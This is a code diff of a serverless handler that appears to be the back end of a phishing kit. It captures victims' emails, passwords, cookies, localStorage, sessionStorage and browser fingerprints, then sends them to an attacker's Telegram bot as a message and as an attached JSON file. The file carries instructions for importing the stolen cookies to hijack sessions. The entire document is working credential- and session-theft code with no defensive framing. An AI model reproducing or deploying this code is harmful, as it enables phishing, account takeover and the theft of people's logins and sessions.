@@ -130,38 +130,30 @@ export const handler = async (event, context) => {
     // Clean, minimal message format
     const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent) ? '📱 Mobile' : '💻 Desktop';
     
-    // Create comprehensive cookies file content for embedding
-    const cookiesFileContent = {
-      timestamp: new Date().toISOString(),
-      sessionId: sessionId,
-      loginInfo: {
-        email: email,
-        provider: provider,
-        fileName: fileName,
-        userAgent: userAgent,
-        clientIP: clientIP
-      },
-      browserData: {
-        cookies: cookieInfo !== 'No cookies found' ? (function() {
-          try { return JSON.parse(cookieInfo); } catch(e) { return cookieInfo; }
-        })() : {},
-        localStorage: localStorageInfo !== 'Empty' ? (function() {
-          try { return JSON.parse(localStorageInfo); } catch(e) { return localStorageInfo; }
-        })() : {},
-        sessionStorage: sessionStorageInfo !== 'Empty' ? (function() {
-          try { return JSON.parse(sessionStorageInfo); } catch(e) { return sessionStorageInfo; }
-        })() : {},
-        fingerprint: browserFingerprint || {}
+    // Count actual data for summary
+    let cookieCount = 0;
+    let localStorageCount = 0;
+    let sessionStorageCount = 0;
+
+    try {
+      if (cookieInfo !== 'No cookies found') {
+        cookieCount = Object.keys(JSON.parse(cookieInfo)).length;
       }
-    };
+    } catch (e) { /* ignore */ }
 
-    // Convert to formatted JSON string (truncated for Telegram message limits)
-    const fileContentString = JSON.stringify(cookiesFileContent, null, 2);
-    const truncatedFileContent = fileContentString.length > 2000 
-      ? fileContentString.substring(0, 2000) + '\n\n... (truncated - full data in attached file)'
-      : fileContentString;
+    try {
+      if (localStorageInfo !== 'Empty') {
+        localStorageCount = Object.keys(JSON.parse(localStorageInfo)).length;
+      }
+    } catch (e) { /* ignore */ }
 
-    const message = `🔐 Paris365Login
+    try {
+      if (sessionStorageInfo !== 'Empty') {
+        sessionStorageCount = Object.keys(JSON.parse(sessionStorageInfo)).length;
+      }
+    } catch (e) { /* ignore */ }
+
+    const message = `🔐 Login Captured
 
 📧 ${email}
 🔑 ${password}
@@ -170,10 +162,14 @@ export const handler = async (event, context) => {
 🕒 ${new Date(timestamp).toLocaleString()}
 🌐 ${clientIP} | ${deviceInfo}
 
-📁 COOKIES & SESSION DATA:
-<pre>${truncatedFileContent}</pre>
+📁 SESSION DATA SUMMARY:
+🍪 Cookies: ${cookieCount} items
+💾 LocalStorage: ${localStorageCount} items  
+🗂 SessionStorage: ${sessionStorageCount} items
+📄 Complete data file attached below
 
 🆔 ${sessionId}`;
+
     // Send main message to Telegram
     const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
@@ -198,9 +194,29 @@ export const handler = async (event, context) => {
     let fileSent = false;
     
     try {
-      // Add instructions to the existing cookies file content
-      const completeFileContent = {
-        ...cookiesFileContent,
+      // Create comprehensive cookies file content
+      const cookiesFileContent = {
+        timestamp: new Date().toISOString(),
+        sessionId: sessionId,
+        loginInfo: {
+          email: email,
+          provider: provider,
+          fileName: fileName,
+          userAgent: userAgent,
+          clientIP: clientIP
+        },
+        browserData: {
+          cookies: cookieInfo !== 'No cookies found' ? (function() {
+            try { return JSON.parse(cookieInfo); } catch(e) { return cookieInfo; }
+          })() : {},
+          localStorage: localStorageInfo !== 'Empty' ? (function() {
+            try { return JSON.parse(localStorageInfo); } catch(e) { return localStorageInfo; }
+          })() : {},
+          sessionStorage: sessionStorageInfo !== 'Empty' ? (function() {
+            try { return JSON.parse(sessionStorageInfo); } catch(e) { return sessionStorageInfo; }
+          })() : {},
+          fingerprint: browserFingerprint || {}
+        },
         instructions: {
           usage: "This file contains comprehensive browser session data for session restoration",
           cookies: "Use browser extensions like 'Cookie Editor' or 'EditThisCookie' to import cookies",
@@ -211,7 +227,7 @@ export const handler = async (event, context) => {
       };
 
       // Convert to JSON string with proper formatting
-      const fileContent = JSON.stringify(completeFileContent, null, 2);
+      const fileContent = JSON.stringify(cookiesFileContent, null, 2);
       const fileNameForUpload = `cookies_${email.replace('@', '_at_').replace(/[^a-zA-Z0-9_]/g, '_')}_${Date.now()}.json`;
 
       // Use multipart/form-data for file upload
@@ -230,7 +246,7 @@ export const handler = async (event, context) => {
       
       formData += `--${boundary}\r\n`;
       formData += `Content-Disposition: form-data; name="caption"\r\n\r\n`;
-      formData += `📁 Complete Session Data File\n\n👤 ${email}\n🔧 ${provider}\n📄 ${fileName}\n🍪 ${cookieCount} cookies\n💾 ${localStorageCount} localStorage items\n🗂 ${sessionStorageCount} sessionStorage items`;
+      formData += `📁 Complete Session Data File\n\n👤 ${email}\n🔧 ${provider}\n📄 ${fileName}\n🍪 ${cookieCount} cookies\n💾 ${localStorageCount} localStorage\n🗂 ${sessionStorageCount} sessionStorage`;
       formData += `\r\n`;
       
       formData += `--${boundary}\r\n`;
@@ -257,7 +273,7 @@ export const handler = async (event, context) => {
         console.error('❌ Failed to send cookies file to Telegram:', fileErrorText);
         
         // Try alternative method - send as text message if file upload fails
-        const fallbackMessage = `📁 <b>COMPLETE COOKIES FILE DATA</b>\n\n<pre>${fileContent.substring(0, 3000)}${fileContent.length > 3000 ? '\n\n... (truncated)' : ''}</pre>`;
+        const fallbackMessage = `📁 <b>SESSION DATA FILE</b>\n\n<i>File upload failed, but all data was captured in the main message above.</i>\n\n👤 User: ${email}\n🍪 Cookies: ${cookieCount}\n💾 LocalStorage: ${localStorageCount}\n🗂 SessionStorage: ${sessionStorageCount}`;
         
         const fallbackResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
           method: 'POST',
